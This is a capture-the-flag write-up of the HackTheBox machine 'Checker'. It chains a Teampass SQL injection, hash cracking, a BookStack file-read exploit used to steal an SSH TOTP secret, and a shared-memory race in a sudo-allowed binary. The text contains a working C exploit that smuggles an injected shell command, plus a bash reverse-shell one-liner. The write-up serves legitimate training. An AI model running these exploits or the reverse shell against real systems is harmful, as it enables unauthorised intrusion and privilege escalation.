---
title: Checker
published: 2025-02-28
description: "Checker is a challenging machine that demonstrates CVE-2023-1545 on Teampass, CVE-2023-6199 on BookStack, the use of Google Authenticator as SSH TOTP, and a race condition on shared memory for privilege escalation."
image: /banner/Checker.png
tags: [Linux, Hard, TOTP, Bookstack, Teampass, Race Condition]
category: "HackTheBox"
draft: false
lang: "en"
---

# Description

Checker is a challenging machine that demonstrates [CVE-2023-1545](https://www.cve.org/CVERecord?id=CVE-2023-1545) on Teampass, [CVE-2023-6199](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6199) on BookStack, the use of Google Authenticator as SSH TOTP, and a race condition on shared memory for privilege escalation.

# Recon

## nmap

Result of `nmap` scan :

```bash
# Nmap 7.95 scan initiated Wed Feb 26 22:44:28 2025 as: nmap -vvv -F -T4 -4 -sSCV -oN fast_tcp_scan.txt 10.10.11.56
Nmap scan report for checker.htb (10.10.11.56)
Host is up, received echo-reply ttl 63 (0.033s latency).
Scanned at 2025-02-26 22:44:28 WIB for 10s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQsMcD52VU4FwV2qhq65YVV9Flp7+IUAUrkugU+IiOs5ph+Rrqa4aofeBosUCIziVzTUB/vNQwODCRSTNBvdXQ=
|   256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIRBr02nNGqdVIlkXK+vsFIdhcYJoWEVqAIvGCGz+nHY
80/tcp   open  http    syn-ack ttl 63 Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
8080/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-title: 403 Forbidden
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are only three open ports, `22`, `80`, and `8080`. I will check the HTTP response `Location` header, which indicates a redirect. Sometimes, it reveals the domain.

```bash
$ curl -sI http://10.10.11.56/ | rg 'Location'
Location: http://checker.htb/login
```

It redirects to the `checker.htb` domain. Add the domain to the `/etc/hosts` file

```bash
10.10.11.56 checker.htb
```

# Websites

## 80 - TCP

Visiting `checker.htb` shows a login page for `BookStack`.

<p align="center">
  <img src="/machines/checker/bookstack.png" alt="bookstack" />
</p>

Currently, we don't have any credentials. By examining the source code, you can spot the BookStack version that is `v23.10.2`.

<p align="center">
  <img src="/machines/checker/bookstack_version.png" alt="bookstack version" />
</p>

This version has [CVE-2023-6199](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6199) but we need a credential. Let's enumerate port `8080`.

## 8080 - TCP

Visiting `checker.htb:8080` shows a login page for `Teampass`.

<p align="center">
  <img src="/machines/checker/teampass.png" alt="teampass" />
</p>

Since there's no version leak, I will look for and check unauthenticated CVEs. You can do simple search or search it through [CVE](https://www.cve.org) or [Mitre](https://cve.mitre.org/cve/search_cve_list.html)
In the end, I found an unauthenticated SQLI CVE that includes PoC. That is [CVE-2023-1545](https://www.cve.org/CVERecord?id=CVE-2023-1545), it comes with a [PoC](https://huntr.dev/bounties/942c015f-7486-49b1-94ae-b1538d812bc2).
Just run the PoC and you will get two password hashes.

```bash
$ ./teampass_sqli.sh http://checker.htb:8080
There are 2 users in the system:
admin: <admin_hash>
bob: <bob_hash>
```

You can crack it using `hashcat`.

```bash
hashcat -m 3200 teampass_hashes.txt <rockyou> --username
```

You can only crack `bob` hash, but it is enough to log in to the Teampass.

## Web as bob

Inside the Teampass, you can find `bob-access` folder that contains `bookstack login` and `ssh access`.
If you try the `ssh access` credential, you will be asked for a verification code after entering the password.

```bash
$ ssh reader@checker.htb
(reader@checker.htb) Password:
(reader@checker.htb) Verification code:
```

Okay, let's focus on the BookStack because we don't have any knowledge about the verifcation code yet.

## 8080 - TCP again

Back at the BookStack website. Because we have a valid credential, we can follow the [PoC](https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/) to exploit it. The PoC use modified version of [php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) so that it could send the appropriate payload.
We could get the payload format from the same author of the PoC on this [Link](https://fluidattacks.com/advisories/imagination/).

The format is `<img src='data:image/png;base64,[BASE64 HERE]'/>` and the parameter name should be `html`, so we need to modify the script to accomodate it.
You need to change the the `requestor.py` inside the `req_with_response` function before the try except block.

```py
...
def req_with_response(self, s):
        if self.delay > 0:
            time.sleep(self.delay)

        filter_chain = f"php://filter/{s}{self.in_chain}/resource={self.file_to_leak}"
        # DEBUG print(filter_chain)
        merged_data = self.parse_parameter(filter_chain)
        phpfilter = merged_data["html"]
        phpfilter_b64 = base64.b64encode(phpfilter.encode()).decode()
        img = f"<img src='data:image/png;base64,{phpfilter_b64}'/>"
        merged_data["html"] = img
...
```

That should be enough but I don't know what's wrong with my machine that the if else branch inside the try except block wasn't working as intended. I have to modify the condition for `Verb.PUT` to the following to make it work.

```py
elif self.verb.value == "PUT":
```

It's optional if the first modification works well on your machine. According to the PoC, we need to create a book, then create a page, and save the draft. We need to get the page number, `X-CSRF-TOKEN`, and the BookStack cookie.
You can retrieve all of these data from your browser network devtools tab after saving the draft. Now, what file we need to exfiltrate. Because we want to bypass the verification code on the SSH, we need to identify what technology behind it.
<br><br>
I came accross this [Post](https://www.tecmint.com/ssh-two-factor-authentication/) that explain how to setup TOTP on SSH using Google Authenticator. The output from this post is similar to the server so this should be it.
According to the post, the secret key used for generating the TOTP is stored at `.google_authenticator` inside the user's home directory. Let's try to read `/home/reader/.google_authenticator` file.

```bash
$ python filters_chain_oracle_exploit_bookstack_lfr_ssrf.py --target 'http://checker.htb/ajax/page/9/save-draft' --file '/home/reader/.google_authenticator' --verb PUT --parameter html --headers '{"X-CSRF-TOKEN": "2eWRQgwyDzLfzL8amvM5z4iVprsO0GaXBQG0K2gw", "Content-Type":"application/x-www-form-urlencoded","Cookie""bookstack_session=eyJpdiI6IjExbkJYcmlaZTJITE5IREtSSllVUGc9PSIsInZhbHVlIjoiMUZBcjZTcFFYVFZNMklPenMyb3pveHNyUFNHdytsTEVMbkcyZjh1RERqNXhjdE5zVXdSYWczZTlEck9xTXJrazB3MS9ZbUZCS0pRODVkQjR0UGcvUU9MS1AyeW8yUW9yMmNzTE92aGFRbUNFeVAzeUtjMWFZQnpWTU5mMlNraEoiLCJtYWMiOiI3N2YzMGYxMjM5OGM5YmEwZGMxZTAzMmZiMGMxNjU1YzBhZjhmNjNjYTI5N2MwYmM5NzUyOGVlYzVjZTQ3M2Y4IiwidGFnIjoiIn0%3D"}'       [*] The following URL is targeted : http://checker.htb/ajax/page/9/save-draft
[*] The following local file is leaked : /home/reader/.google_authenticator
[*] Running PUT requests
[*] Additionnal headers used : {"X-CSRF-TOKEN": "2eWRQgwyDzLfzL8amvM5z4iVprsO0GaXBQG0K2gw", "Content-Type":"application/x-www-form-urlencoded","Cookie":"bookstack_session=eyJpdiI6IjExbkJYcmlaZTJITE5IREtSSllVUGc9PSIsInZhbHVlIjoiMUZBcjZTcFFYVFZNMklPenMyb3pveHNyUFNHdytsTEVMbkcyZjh1RERqNXhjdE5zVXdSYWczZTlEck9xTXJrazB3MS9ZbUZCS0pRODVkQjR0UGcvUU9MS1AyeW8yUW9yMmNzTE92aGFRbUNFeVAzeUtjMWFZQnpWTU5mMlNraEoiLCJtYWMiOiI3N2YzMGYxMjM5OGM5YmEwZGMxZTAzMmZiMGMxNjU1YzBhZjhmNjNjYTI5N2MwYmM5NzUyOGVlYzVjZTQ3M2Y4IiwidGFnIjoiIn0%3D"}
[-] File /home/reader/.google_authenticator is either empty, or the exploit did not work :
```

Unfortunately, the current user doesn't have read access to it. We need to gather more information. The BookStack already contain some pages, the `Basic Backup with cp` page contains a backup script. This script will backup `/home` to the `/backup/home_backup`, maybe the machine uses this script either way it's worth a try. The Google Authenticator secret key should be at `/backup/home_backup/home/reader/.google_authenticator`.

```bash
$ python filters_chain_oracle_exploit_bookstack_lfr_ssrf.py --target 'http://checker.htb/ajax/page/9/save-draft' --file '/backup/home_backup/home/reader/.google_authenticator' --verb PUT --parameter html --headers '{"X-CSRF-TOKEN": "2eWRQgwyDzLfzL8amvM5z4iVprsO0GaXBQG0K2gw", "Content-Type":"application/x-www-form-urlencoded","Cookie":"bookstack_session=eyJpdiI6IjExbkJYcmlaZTJITE5IREtSSllVUGc9PSIsInZhbHVlIjoiMUZBcjZTcFFYVFZNMklPenMyb3pveHNyUFNHdytsTEVMbkcyZjh1RERqNXhjdE5zVXdSYWczZTlEck9xTXJrazB3MS9ZbUZCS0pRODVkQjR0UGcvUU9MS1AyeW8yUW9yMmNzTE92aGFRbUNFeVAzeUtjMWFZQnpWTU5mMlNraEoiLCJtYWMiOiI3N2YzMGYxMjM5OGM5YmEwZGMxZTAzMmZiMGMxNjU1YzBhZjhmNjNjYTI5N2MwYmM5NzUyOGVlYzVjZTQ3M2Y4IiwidGFnIjoiIn0%3D"}'
[*] The following URL is targeted : http://checker.htb/ajax/page/9/save-draft
[*] The following local file is leaked : /backup/home_backup/home/reader/.google_authenticator
[*] Running PUT requests
[*] Additionnal headers used : {"X-CSRF-TOKEN": "2eWRQgwyDzLfzL8amvM5z4iVprsO0GaXBQG0K2gw", "Content-Type":"application/x-www-form-urlencoded","Cookie":"bookstack_session=eyJpdiI6IjExbkJYcmlaZTJITE5IREtSSllVUGc9PSIsInZhbHVlIjoiMUZBcjZTcFFYVFZNMklPenMyb3pveHNyUFNHdytsTEVMbkcyZjh1RERqNXhjdE5zVXdSYWczZTlEck9xTXJrazB3MS9ZbUZCS0pRODVkQjR0UGcvUU9MS1AyeW8yUW9yMmNzTE92aGFRbUNFeVAzeUtjMWFZQnpWTU5mMlNraEoiLCJtYWMiOiI3N2YzMGYxMjM5OGM5YmEwZGMxZTAzMmZiMGMxNjU1YzBhZjhmNjNjYTI5N2MwYmM5NzUyOGVlYzVjZTQ3M2Y4IiwidGFnIjoiIn0%3D"}
RFZEQlJB
b'<SECRET_KEY>\n" TOTP_AUTH\n'
```

With the secret key, we could use online OTP generator like [IT - Tools](https://it-tools.tech/otp-generator) or we could use tool like `oathtool`. I will use the latter.

```bash
oathtool --totp -b "<SECRET_KEY>"
```

Make sure you have adjust your timezone according to your vpn and use the TOTP right away because it will expire soon enough. If you encounter `Error "Operation not permitted" while writing config` issue, you need to change your timezone to `Europe/London` and vpn to Europe.

# Shell as reader

## User flag

```bash
-bash-5.1$ cat user.txt
deadbeef403839fba2e22e3f0031fake
```

## Enumeration

`sudo -l` shows that we have `sudo` access to `/opt/hash-checker/check-leak.sh *`

```bash
bash-5.1$ sudo -l
Matching Defaults entries for reader on checker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User reader may run the following commands on checker:
    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
```

The script basically just wrapper for `/opt/hash-checker/check_leak` binary

```bash
bash-5.1$ cat /opt/hash-checker/check-leak.sh
#!/bin/bash
source `dirname $0`/.env
USER_NAME=$(/usr/bin/echo "$1" | /usr/bin/tr -dc '[:alnum:]')
/opt/hash-checker/check_leak "$USER_NAME"
```

It's just make sure the first flag is alphanumeric characters. Let's bring the binary on our machine and static analyze it.

```bash
scp reader@checker.htb:/opt/hash-checker/check_leak check_leak
```

## check_leak program

Here's the `main` function :

```c
undefined8 main(int param_1,ulong param_2)
{
  char *__s;
  char cVar1;
  uint uVar2;
  char *pcVar3;
  char *pcVar4;
  char *pcVar5;
  char *pcVar6;
  size_t sVar7;
  void *__ptr;

  pcVar3 = getenv("DB_HOST");
  pcVar4 = getenv("DB_USER");
  pcVar5 = getenv("DB_PASSWORD");
  pcVar6 = getenv("DB_NAME");
  if (*(char *)((param_2 + 8 >> 3) + 0x7fff8000) != '\0') {
    __asan_report_load8(param_2 + 8);
  }
  __s = *(char **)(param_2 + 8);
  if ((((pcVar3 == (char *)0x0) || (pcVar4 == (char *)0x 0)) || (pcVar5 == (char *)0x0)) ||
     (pcVar6 == (char *)0x0)) {
    if (DAT_80019140 != '\0') {
      __asan_report_load8(&stderr);
    }
    fwrite("Error: Missing database credentials in envir onment\n",1,0x33,stderr);
    __asan_handle_no_return();
    exit(1);
  }
  if (param_1 != 2) {
    if (*(char *)((param_2 >> 3) + 0x7fff8000) != '\0') {
      __asan_report_load8(param_2);
    }
    if (DAT_80019140 != '\0') {
      __asan_report_load8(&stderr);
    }
    fprintf(stderr,"Usage: %s <USER>\n");
    __asan_handle_no_return();
    exit(1);
  }
  if (__s != (char *)0x0) {
    cVar1 = *(char *)(((ulong)__s >> 3) + 0x7fff8000);
    if (cVar1 <= (char)((byte)__s & 7) && cVar1 != '\0') {
      __asan_report_load1(__s);
    }
    if (*__s != '\0') {
      sVar7 = strlen(__s);
      if (0x14 < sVar7) {
        if (DAT_80019140 != '\0') {
          __asan_report_load8(&stderr);
        }
        fwrite("Error: <USER> is too long. Maximum lengt h is 20 characters.\n",1,0x3c,stderr);
        __asan_handle_no_return();
        exit(1);
      }
      __ptr = (void *)fetch_hash_from_db(pcVar3,pcVar4, pcVar5,pcVar6,__s);
      if (__ptr == (void *)0x0) {
        puts("User not found in the database.");
      }
      else {
        cVar1 = check_bcrypt_in_file("/opt/hash-checker/leaked_hashes.txt",__ptr);
        if (cVar1 == '\0') {
          puts("User is safe.");
        }
        else {
          puts("Password is leaked!");
          if (DAT_8001913c != '\0') {
            __asan_report_load8(&stdout);
          }
          fflush(stdout);
          uVar2 = write_to_shm(__ptr);
          printf("Using the shared memory 0x%X as temp location\n",(ulong)uVar2);
          if (DAT_8001913c != '\0') {
            __asan_report_load8(&stdout);
          }
          fflush(stdout);
          sleep(1);
          notify_user(pcVar3,pcVar4,pcVar5,pcVar6,uVar2) ;
          clear_shared_memory(uVar2);
        }
        free(__ptr);
      }
      return 0;
    }
  }
  if (DAT_80019140 != '\0') {
    __asan_report_load8(&stderr);
  }
  fwrite("Error: <USER> is not provided.\n",1,0x1f,stder r);
  __asan_handle_no_return();
  exit(1);
}
```

Here's the program flow :

- First few lines just load environment variables and make sure it's not empty.
- Check existence for the first paramater and make sure it's not more than 20 characters.
- Fetch the user password hash by fetching from database using `fetch_hash_from_db` function and compare it with bcrypt hashes in `/opt/hash-checker/leaked_hashes.txt` line by line using `check_bcrypt_in_file` function.
- If there's a match, the program will create a shared memory using `write_to_shm` function, sleep 1 second, notify user using `notify_user` function, and clear the shared memory.

The 1 second sleep is interesting because it will trigger a race condition on the shared memory. Let's analyze further to take advantage the race condition. <br>

Here's the `write_to_shm` function :

```c
int write_to_shm(undefined8 param_1)
{
  char cVar1;
  int iVar2;
  int __shmid;
  undefined8 *puVar3;
  time_t tVar4;
  char *__s;
  char *__s_00;
  size_t sVar5;
  char *pcVar6;
  undefined8 *puVar7;
  ulong uVar8;
  long in_FS_OFFSET;
  undefined8 local_88 [11];
  long local_30;

  puVar7 = local_88;
  if (__asan_option_detect_stack_use_after_return != 0) {
    puVar3 = (undefined8 *)__asan_stack_malloc_0(0x4 0);
    if (puVar3 != (undefined8 *)0x0) {
      puVar7 = puVar3;
    }
  }
  *puVar7 = 0x41b58ab3;
  puVar7[1] = "1 32 8 7 now:105";
  puVar7[2] = write_to_shm;
  uVar8 = (ulong)puVar7 >> 3;
  *(undefined4 *)(uVar8 + 0x7fff8000) = 0xf1f1f1f1;
  *(undefined4 *)(uVar8 + 0x7fff8004) = 0xf3f3f300;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  tVar4 = time((time_t *)0x0);
  srand((uint)tVar4);
  iVar2 = rand();
  __shmid = shmget(iVar2 % 0xfffff,0x400,0x3b6);
  if (__shmid == -1) {
    perror("shmget");
    __asan_handle_no_return();
    exit(1);
  }
  __s = (char *)shmat(__shmid,(void *)0x0,0);
  if (__s == (char *)0xffffffffffffffff) {
    perror("shmat");
    __asan_handle_no_return();
    exit(1);
  }
  tVar4 = time((time_t *)0x0);
  if (*(char *)(((ulong)(puVar7 + 4) >> 3) + 0x7fff8000) ! = '\0') {
    tVar4 = __asan_report_store8(puVar7 + 4);
  }
  puVar7[4] = tVar4;
  __s_00 = ctime(puVar7 + 4);
  sVar5 = strlen(__s_00);
  pcVar6 = __s_00 + (sVar5 - 1);
  cVar1 = *(char *)(((ulong)pcVar6 >> 3) + 0x7fff8000);
  if (cVar1 <= (char)((byte)pcVar6 & 7) && cVar1 != '\0')  {
    __asan_report_store1(pcVar6);
  }
  *pcVar6 = '\0';
  snprintf(__s,0x400,"Leaked hash detected at %s > %s \n",__s_00,param_1);
  shmdt(__s);
  if (local_88 == puVar7) {
    *(undefined8 *)(uVar8 + 0x7fff8000) = 0;
  }
  else {
    *puVar7 = 0x45e0360e;
    *(undefined8 *)(uVar8 + 0x7fff8000) = 0xf5f5f5f5f5f 5f5f5;
    *(undefined1 *)puVar7[7] = 0;
  }
  if (local_30 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return iVar2 % 0xfffff;
}
```

The interesting part is the key generation `iVar2`.

```c
  tVar4 = time((time_t *)0x0);
  srand((uint)tVar4);
  iVar2 = rand();
  __shmid = shmget(iVar2 % 0xfffff,0x400,0x3b6);
```

It uses the current time as the seed, so it's possible to create a same shared memory. The `0x3b6` is the permissions, it's `1666` in octal. <br>
The next interesting part what written inside the shared memory because it will useful later.

```c
  __s_00 = ctime(puVar7 + 4);
  sVar5 = strlen(__s_00);
  pcVar6 = __s_00 + (sVar5 - 1);
  cVar1 = *(char *)(((ulong)pcVar6 >> 3) + 0x7fff8000);
  if (cVar1 <= (char)((byte)pcVar6 & 7) && cVar1 != '\0')  {
    __asan_report_store1(pcVar6);
  }
  *pcVar6 = '\0';
  snprintf(__s,0x400,"Leaked hash detected at %s > %s \n",__s_00,param_1);
  shmdt(__s);
```

It's write `Leaked hash detected at %s > %s` to the shared memory, the first format is date and the second one is the password hash. Let's move on the `notify_user` function. <br>

Here's the `notify_user` function :

```c
void notify_user(undefined8 param_1,undefined8 par am_2,char *param_3,undefined8 param_4,uint param _5)
{
  char cVar1;
  uint __shmid;
  int iVar2;
  undefined8 *puVar3;
  char *__haystack;
  char *pcVar4;
  undefined8 uVar5;
  FILE *__stream;
  char *pcVar6;
  ulong uVar7;
  bool bVar8;
  char *extraout_RDX;
  ulong uVar9;
  undefined8 *puVar10;
  long in_FS_OFFSET;
  undefined8 local_1a8 [47];
  long local_30;

  puVar10 = local_1a8;
  if ((__asan_option_detect_stack_use_after_return != 0)  &&
     (puVar3 = (undefined8 *)__asan_stack_malloc_3(0x 160), puVar3 != (undefined8 *)0x0)) {
    puVar10 = puVar3;
  }
  *puVar10 = 0x41b58ab3;
  puVar10[1] = "1 32 256 17 result_buffer:171";
  puVar10[2] = notify_user;
  uVar9 = (ulong)puVar10 >> 3;
  *(undefined4 *)(uVar9 + 0x7fff8000) = 0xf1f1f1f1;
  *(undefined4 *)(uVar9 + 0x7fff8024) = 0xf3f3f3f3;
  *(undefined4 *)(uVar9 + 0x7fff8028) = 0xf3f3f3f3;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  __shmid = shmget(param_5,0,0x1b6);
  if (__shmid == 0xffffffff) {
    printf("No shared memory segment found for the gi ven address: 0x%X\n",(ulong)param_5);
  }
  else {
    __haystack = (char *)shmat(__shmid,(void *)0x0,0);
    if (__haystack == (char *)0xffffffffffffffff) {
      if (DAT_80019140 != '\0') {
        __asan_report_load8(&stderr);
      }
      fprintf(stderr,
              "Unable to attach to shared memory segment with ID %d. Please check if the segment is acc essible.\n"
              ,(ulong)__shmid);
    }
    else {
      pcVar4 = strstr(__haystack,"Leaked hash detected" );
      if (pcVar4 == (char *)0x0) {
        puts("No hash detected in shared memory.");
      }
      else {
        pcVar4 = strchr(pcVar4,0x3e);
        if (pcVar4 == (char *)0x0) {
          puts("Malformed data in the shared memory.");
        }
        else {
          uVar5 = trim_bcrypt_hash(pcVar4 + 1);
          iVar2 = setenv("MYSQL_PWD",param_3,1);
          if (iVar2 == 0) {
            iVar2 = snprintf((char *)0x0,0,
                             "mysql -u %s -D %s -s -N -e \'select em ail from teampass_users where pw = \ "%s\"\'"
                             ,param_2,param_4,uVar5);
            pcVar4 = (char *)malloc((long)(iVar2 + 1));
            if (pcVar4 == (char *)0x0) {
              puts("Failed to allocate memory for command ");
              shmdt(__haystack);
              bVar8 = false;
            }
            else {
              snprintf(pcVar4,(long)(iVar2 + 1),
                       "mysql -u %s -D %s -s -N -e \'select email from teampass_users where pw = \"%s\"\ '"
                       ,param_2,param_4,uVar5);
              __stream = popen(pcVar4,"r");
              if (__stream == (FILE *)0x0) {
                puts("Failed to execute MySQL query");
                free(pcVar4);
                shmdt(__haystack);
                bVar8 = false;
              }
              else {
                pcVar6 = fgets((char *)(puVar10 + 4),0x100,__ stream);
                if (pcVar6 == (char *)0x0) {
                  puts("Failed to read result from the db");
                  pclose(__stream);
                  free(pcVar4);
                  shmdt(__haystack);
                  bVar8 = false;
                }
                else {
                  pclose(__stream);
                  free(pcVar4);
                  pcVar4 = strchr((char *)(puVar10 + 4),10);
                  if (pcVar4 != (char *)0x0) {
                    cVar1 = *(char *)(((ulong)pcVar4 >> 3) + 0x 7fff8000);
                    if (cVar1 <= (char)((byte)pcVar4 & 7) && cV ar1 != '\0') {
                      __asan_report_store1(pcVar4);
                    }
                    *pcVar4 = '\0';
                  }
                  pcVar4 = strdup((char *)(puVar10 + 4));
                  if (pcVar4 == (char *)0x0) {
                    puts("Failed to allocate memory for result s tring");
                    shmdt(__haystack);
                    bVar8 = false;
                  }
                  else {
                    pcVar6 = (char *)(puVar10 + 4);
                    cVar1 = *(char *)(((ulong)pcVar6 >> 3) + 0x 7fff8000);
                    if (cVar1 <= (char)((byte)pcVar6 & 7) && cV ar1 != '\0') {
                      __asan_report_load1(pcVar6);
                      pcVar6 = extraout_RDX;
                    }
                    if (*pcVar6 != '\0') {
                      printf("User will be notified via %s\n",puVa r10 + 4);
                    }
                    free(pcVar4);
                    bVar8 = true;
                  }
                }
              }
            }
          }
          else {
            perror("setenv");
            shmdt(__haystack);
            bVar8 = false;
          }
          uVar7 = (ulong)(puVar10 + 4) >> 3;
          *(undefined4 *)(uVar7 + 0x7fff8000) = 0xf8f8f8f 8;
          *(undefined4 *)(uVar7 + 0x7fff8004) = 0xf8f8f8f 8;
          *(undefined4 *)(uVar7 + 0x7fff8008) = 0xf8f8f8f 8;
          *(undefined4 *)(uVar7 + 0x7fff800c) = 0xf8f8f8f 8;
          *(undefined4 *)(uVar7 + 0x7fff8010) = 0xf8f8f8f 8;
          *(undefined4 *)(uVar7 + 0x7fff8014) = 0xf8f8f8f 8;
          *(undefined4 *)(uVar7 + 0x7fff8018) = 0xf8f8f8f 8;
          *(undefined4 *)(uVar7 + 0x7fff801c) = 0xf8f8f8f 8;
          if (!bVar8) goto LAB_00103b3a;
        }
      }
      iVar2 = shmdt(__haystack);
      if (iVar2 == -1) {
        perror("shmdt");
      }
      unsetenv("MYSQL_PWD");
    }
  }
LAB_00103b3a:
  if (local_1a8 == puVar10) {
    *(undefined8 *)(uVar9 + 0x7fff8000) = 0;
    *(undefined8 *)(uVar9 + 0x7fff8008) = 0;
    *(undefined8 *)(uVar9 + 0x7fff8010) = 0;
    *(undefined8 *)(uVar9 + 0x7fff8018) = 0;
    *(undefined8 *)(uVar9 + 0x7fff8020) = 0;
    *(undefined4 *)(uVar9 + 0x7fff8028) = 0;
  }
  else {
    *puVar10 = 0x45e0360e;
    *(undefined8 *)(uVar9 + 0x7fff8000) = 0xf5f5f5f5f5f 5f5f5;
    *(undefined8 *)(uVar9 + 0x7fff8008) = 0xf5f5f5f5f5f 5f5f5;
    *(undefined8 *)(uVar9 + 0x7fff8010) = 0xf5f5f5f5f5f 5f5f5;
    *(undefined8 *)(uVar9 + 0x7fff8018) = 0xf5f5f5f5f5f 5f5f5;
    *(undefined8 *)(uVar9 + 0x7fff8020) = 0xf5f5f5f5f5f 5f5f5;
    *(undefined4 *)(uVar9 + 0x7fff8028) = 0xf5f5f5f5;
    *(undefined1 *)puVar10[0x3f] = 0;
  }
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
  __stack_chk_fail();
}
```

Here's the interesting part :

```c
pcVar4 = strstr(__haystack,"Leaked hash detected" );
      if (pcVar4 == (char *)0x0) {
        puts("No hash detected in shared memory.");
      }
      else {
        pcVar4 = strchr(pcVar4,0x3e);
        if (pcVar4 == (char *)0x0) {
          puts("Malformed data in the shared memory.");
        }
        else {
          uVar5 = trim_bcrypt_hash(pcVar4 + 1);
          iVar2 = setenv("MYSQL_PWD",param_3,1);
          if (iVar2 == 0) {
            iVar2 = snprintf((char *)0x0,0,
                             "mysql -u %s -D %s -s -N -e \'select em ail from teampass_users where pw = \ "%s\"\'"
                             ,param_2,param_4,uVar5);
            pcVar4 = (char *)malloc((long)(iVar2 + 1));
            if (pcVar4 == (char *)0x0) {
              puts("Failed to allocate memory for command ");
              shmdt(__haystack);
              bVar8 = false;
            }
            else {
              snprintf(pcVar4,(long)(iVar2 + 1),
                       "mysql -u %s -D %s -s -N -e \'select email from teampass_users where pw = \"%s\"\ '"
                       ,param_2,param_4,uVar5);
              __stream = popen(pcVar4,"r");
              if (__stream == (FILE *)0x0) {
                puts("Failed to execute MySQL query");
                free(pcVar4);
                shmdt(__haystack);
                bVar8 = false;
              }
```

We have control on `uVar5` because it's the content of the shared memory, it must contains `Leaked hash detected` and `>`. After the `>` character is the `uVar5` content, it will execute the formatted string `pcVar4` using `popen` function so we can inject a command. <br>
To exploit this scenario, we need to spam create shared memory segments so that when we run the `check_leak` program with a compromised username, it will use our shared memory instead.

Here's the C program to create a shared memory and inject malicious command :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

int shmid;

int main(int argc, char *argv[]) {
  int seed = time(NULL);
  srand(seed);
  int shmkey = rand() % 0xfffff;
  shmid = shmget(shmkey, 0x400, 0x3b6);
  printf("shmid: 0x%x\n", shmkey);
  char *shm = (char *)shmat(shmid, NULL, 0);
  sprintf(shm, "Leaked hash detected at %s > %s \n", "bruh", "'; /tmp/pwn;#");
  shmdt(shm);
  return 0;
}
```

Create a reverse shell on `/tmp/pwn`.

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.x.x/9001 0>&1' > /tmp/pwn
chmod +x /tmp/pwn
```

Compile the code and run it inside a while loop.

```bash
gcc exploit.c -o exploit
chmod +x exploit
while true; do
  ./exploit
done
```

Open another session and execute the following command :

```bash
sudo /opt/hash-checker/check-leak.sh bob
```

And you should a reverse shell.

# Shell as root

## Root flag

```bash
root@checker:~# cat root.txt
cat root.txt
deadbeef254725ceda717de1892bfake
```
